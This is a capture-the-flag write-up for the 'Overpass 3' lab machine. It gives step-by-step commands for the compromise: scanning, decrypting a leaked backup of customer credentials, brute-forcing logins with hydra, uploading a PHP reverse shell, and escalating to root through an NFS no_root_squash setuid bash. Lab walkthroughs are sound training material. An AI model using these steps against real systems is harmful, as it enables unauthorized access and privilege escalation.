
# Overpass 3

## *Web flag*

We'll start with our usual nmap scan:

```bash
$ sudo nmap 10.10.69.167 -Pn -p- -vv -A -T4 --script discovery,vuln -oN nmap-scan --min-parallelism 55
```

```bash
$ cat nmap-scan | grep -o -e "[0-9]\+/tcp .*"
```

- [ ] 21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3
- [ ] 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
- [ ] 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.37 ((centos))

We'll start with ***http*** service. Nmap tells us there's a backup folder:

```
| http-enum: 
|   /backups/: Backup folder w/ directory listing
|_  /icons/: Potentially interesting folder w/ directory listing
```

Luckily for us, there's a ***backup.zip*** file. Downoad it.

```bash
$ unzip backup.zip

$ gpg --import priv.key

$ gpg -d CustomerDetails.xlsx.gpg > CustomerDetails.xlsx

$ gpg --delete-secret-and-public-keys Paradox
```

![backup](https://i.postimg.cc/JhjBjLbT/backup.png)

Save the credentials to ***creds.txt*** file in 'username:password' format.

Next, lets try to login to other services with obtained credentials:

```bash
$ hydra -C creds.txt 10.10.69.167 ftp -V

$ hydra -C creds.txt 10.10.69.167 ssh -V
```

We're able to login to ftp! Upload a php reverse shell there and visit it in your 
browser.

Navigate to apache's home directory:

```bash
$ cd /usr/share/httpd
```

You'll find the web flag in there.

---

## *User & Root flags*

 Next, switch to Paradox user (use the credentials
from the xlsx file). Download and run ***linpeas.ng***.

An interesting PE vector pops out:

```
╔══════════╣ Analyzing NFS Exports Files (limit 70)
-rw-r--r--. 1 root root 54 nov 18  2020 /etc/exports
/home/james *(rw,fsid=0,sync,no_root_squash,insecure)
```

Get the mount information about NFS server:

```bash
$ showmount -e 10.10.69.167
```

```
clnt_create: RPC: Unable to receive
```

Apparently, nfs is accessible only from that host. We'll use ssh port forwarding
to access the service. First, generate ssh keys using `ssh-keygen`, then transfer
the public key to the host and append it to ***/.ssh/authorized_keys***.

After you're done, forward the local port 2049 to the remote one:

```bash
$ ssh -i id_rsa paradox@10.10.69.167 -L 2049:10.10.69.167:2049
```

Now, exploit [NFS no root squash](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/nfs-no_root_squash-misconfiguration-pe)

```bash
$ mkdir pe

$ sudo mount -t nfs localhost:/ ./pe

$ cd pe

$ su root

$ cp /bin/bash .

$ chmod +s bash
```

Now, copy james's private ssh key from ***pe/.ssh/*** and login as james.

Read the user flag

Escalate to root:

```bash
$ ./bash -p
```

